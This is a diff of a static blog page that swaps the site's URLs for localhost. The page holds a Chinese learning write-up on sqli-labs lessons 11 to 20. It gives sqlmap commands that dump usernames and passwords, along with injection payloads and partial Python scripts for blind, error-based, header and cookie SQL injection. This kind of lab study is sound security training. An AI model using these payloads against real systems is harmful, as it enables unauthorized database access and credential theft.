@@ -8,8 +8,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
-<link rel="shortcut icon" href="https://z0ekball.github.io/favicon.ico?v=1649940180297">
-<link rel="stylesheet" href="https://z0ekball.github.io/styles/main.css">
+<link rel="shortcut icon" href="http://localhost:4000/favicon.ico?v=1649940180241">
+<link rel="stylesheet" href="http://localhost:4000/styles/main.css">
 
 
 
@@ -33,8 +33,8 @@ sqlmap.py -r &quot;C:\Users\丷木丷\Desktop\less-11.txt&quo..." />
       <div class="sidebar" :class="{ 'full-height': menuVisible }">
   <div class="top-container" data-aos="fade-right">
     <div class="top-header-container">
-      <a class="site-title-container" href="https://z0ekball.github.io">
-        <img src="https://z0ekball.github.io/images/avatar.png?v=1649940180297" class="site-logo">
+      <a class="site-title-container" href="http://localhost:4000">
+        <img src="http://localhost:4000/images/avatar.png?v=1649940180241" class="site-logo">
         <h1 class="site-title">z0ekball</h1>
       </a>
       <div class="menu-btn" @click="menuVisible = !menuVisible">
@@ -87,7 +87,7 @@ sqlmap.py -r &quot;C:\Users\丷木丷\Desktop\less-11.txt&quo..." />
       温故而知新
     </div>
     <div class="site-footer">
-      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://z0ekball.github.io/atom.xml" target="_blank">RSS</a>
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="http://localhost:4000/atom.xml" target="_blank">RSS</a>
     </div>
   </div>
 </div>
@@ -99,7 +99,7 @@ sqlmap.py -r &quot;C:\Users\丷木丷\Desktop\less-11.txt&quo..." />
             <h2 class="post-title">sqli-labs(11~20)脚本、sqlmap学习</h2>
             <div class="post-date">2021-06-18</div>
             
-              <div class="feature-container" style="background-image: url('https://z0ekball.github.io/post-images/sqli-labs11~20jiao-ben-sqlmap-xue-xi.webp')">
+              <div class="feature-container" style="background-image: url('http://localhost:4000/post-images/sqli-labs11~20jiao-ben-sqlmap-xue-xi.webp')">
               </div>
             
             <div class="post-content" v-pre>
@@ -111,15 +111,15 @@ sqlmap.py -r &quot;C:\Users\丷木丷\Desktop\less-11.txt&quo..." />
 <h3 id="上传post文件得到参数">上传post文件，得到参数</h3>
 <pre><code>sqlmap.py -r &quot;C:\Users\丷木丷\Desktop\less-11.txt&quot;
 </code></pre>
-<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/1624290761761.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="http://localhost:4000/post-images/1624290761761.png" alt="" loading="lazy"></figure>
 <h3 id="根据参数得到当前数据库">根据参数，得到当前数据库</h3>
 <pre><code>sqlmap.py -r &quot;C:\Users\丷木丷\Desktop\less-11.txt&quot; -p uname --dbs
 </code></pre>
-<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/1624290826466.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="http://localhost:4000/post-images/1624290826466.png" alt="" loading="lazy"></figure>
 <h3 id="获取用户名和密码">获取用户名和密码</h3>
 <pre><code>sqlmap.py -r &quot;C:\Users\丷木丷\Desktop\less-11.txt&quot; -p uname -T &quot;users&quot;  -C &quot;username&quot;,&quot;password&quot; --dump
 </code></pre>
-<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/1624291100650.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="http://localhost:4000/post-images/1624291100650.png" alt="" loading="lazy"></figure>
 <h3 id="脚本查询当前数据库名称采用盲注形式">脚本：查询当前数据库名称(采用盲注形式)</h3>
 <pre><code class="language-python">import requests #比urllib.parse方便
 name=&quot;&quot;
@@ -141,14 +141,14 @@ for i in range(1,30):
 print(name)
 </code></pre>
 <h3 id="结果">结果</h3>
-<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/1624294940779.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="http://localhost:4000/post-images/1624294940779.png" alt="" loading="lazy"></figure>
 <h1 id="less-12">less-12</h1>
 <p>uname=n&quot;) or 1=1 #,其他和11一样</p>
 <h1 id="less-13时间盲注">less-13(时间盲注)</h1>
 <h3 id="获取id和用户名">获取id和用户名</h3>
 <pre><code>sqlmap.py -r &quot;C:\Users\丷木丷\Desktop\less-13.txt&quot; -D &quot;security&quot; -T &quot;users&quot; -C &quot;id&quot;,&quot;username&quot; --dump
 </code></pre>
-<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/1624298061718.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="http://localhost:4000/post-images/1624298061718.png" alt="" loading="lazy"></figure>
 <h3 id="脚本获取id3的用户名参考时间盲注">脚本：获取id=3的用户名，参考时间盲注</h3>
 <pre><code class="language-python">import requests
 import time
@@ -175,7 +175,7 @@ for i in range(1,10):
 print(name)
 </code></pre>
 <h3 id="结果-2">结果</h3>
-<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/1624298188766.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="http://localhost:4000/post-images/1624298188766.png" alt="" loading="lazy"></figure>
 <h1 id="less-14">less-14</h1>
 <p>和13一样的时间盲注，但注意转义成 \&quot;</p>
 <h3 id="脚本获取库">脚本：获取库</h3>
@@ -205,7 +205,7 @@ for i in range(1,10):
 print(name)
 </code></pre>
 <h3 id="结果-3">结果</h3>
-<figure data-type="image" tabindex="7"><img src="https://z0ekball.github.io/post-images/1624299560173.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="http://localhost:4000/post-images/1624299560173.png" alt="" loading="lazy"></figure>
 <h1 id="less-15密码注入点">less-15(密码注入点)</h1>
 <p>和前面一样，注入点改为密码</p>
 <h3 id="脚本获取库-2">脚本：获取库</h3>
@@ -235,7 +235,7 @@ for i in range(1,10):
 print(name)
 </code></pre>
 <h3 id="结果-4">结果</h3>
-<figure data-type="image" tabindex="8"><img src="https://z0ekball.github.io/post-images/1624300007923.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="http://localhost:4000/post-images/1624300007923.png" alt="" loading="lazy"></figure>
 <h1 id="less-16">less-16</h1>
 <p>uname=addmin&amp;passwd=ad&quot; or 1=1 #，注意\&quot;，其他和15一样</p>
 <h1 id="less-17updatexml报错注入">less-17(updatexml报错注入)</h1>
@@ -251,7 +251,7 @@ t=r.text
 print(t)
 </code></pre>
 <h3 id="结果在报错信息中可见库">结果：在报错信息中可见库</h3>
-<figure data-type="image" tabindex="9"><img src="https://z0ekball.github.io/post-images/1624304453223.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="http://localhost:4000/post-images/1624304453223.png" alt="" loading="lazy"></figure>
 <h1 id="less-18user-agent注入">less-18(user-agent注入)</h1>
 <h3 id="脚本post请求修改请求头的user-agent-bibi赖赖转义改的心态崩了">脚本：post请求修改请求头的user-agent    (bibi赖赖：转义改的心态崩了= =)</h3>
 <pre><code class="language-python">import requests
@@ -269,7 +269,7 @@ t=r.text
 print(t)
 </code></pre>
 <h3 id="结果-5">结果</h3>
-<figure data-type="image" tabindex="10"><img src="https://z0ekball.github.io/post-images/1624307139151.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="http://localhost:4000/post-images/1624307139151.png" alt="" loading="lazy"></figure>
 <h1 id="less-19referer注入">less-19(referer注入)</h1>
 <h3 id="脚本跟18一样改成referer就行同样需要转义">脚本：跟18一样，改成referer就行，同样需要转义</h3>
 <pre><code class="language-python">import requests
@@ -287,7 +287,7 @@ t=r.text
 print(t)
 </code></pre>
 <h3 id="结果-6">结果</h3>
-<figure data-type="image" tabindex="11"><img src="https://z0ekball.github.io/post-images/1624307491060.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="http://localhost:4000/post-images/1624307491060.png" alt="" loading="lazy"></figure>
 <h1 id="less-20cookie注入">less-20(cookie注入)</h1>
 <p>cookie中value值' #注入</p>
 <h3 id="脚本">脚本</h3>
@@ -301,21 +301,21 @@ t=r.text
 print(t)
 </code></pre>
 <h3 id="结果整不出来应该是版本问题暂时未解决">结果：整不出来，应该是版本问题，暂时未解决</h3>
-<figure data-type="image" tabindex="12"><img src="https://z0ekball.github.io/post-images/1624308452186.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="12"><img src="http://localhost:4000/post-images/1624308452186.png" alt="" loading="lazy"></figure>
 
             </div>
             
               <div class="tag-container">
                 
-                  <a href="https://z0ekball.github.io/tag/CholFiCiP/" class="tag">
+                  <a href="http://localhost:4000/tag/CholFiCiP/" class="tag">
                     sqlmap
                   </a>
                 
-                  <a href="https://z0ekball.github.io/tag/04IxTMI4I/" class="tag">
+                  <a href="http://localhost:4000/tag/04IxTMI4I/" class="tag">
                     脚本
                   </a>
                 
-                  <a href="https://z0ekball.github.io/tag/Xnf6eEgg-/" class="tag">
+                  <a href="http://localhost:4000/tag/Xnf6eEgg-/" class="tag">
                     sql注入
                   </a>
                 
@@ -324,7 +324,7 @@ print(t)
             
               <div class="next-post">
                 <div class="next">下一篇</div>
-                <a href="https://z0ekball.github.io/post/sqli-jiao-ben/">
+                <a href="http://localhost:4000/post/sqli-jiao-ben/">
                   <h3 class="post-title">
                     sqli-labs(1~10)脚本、sqlmap学习
                   </h3>
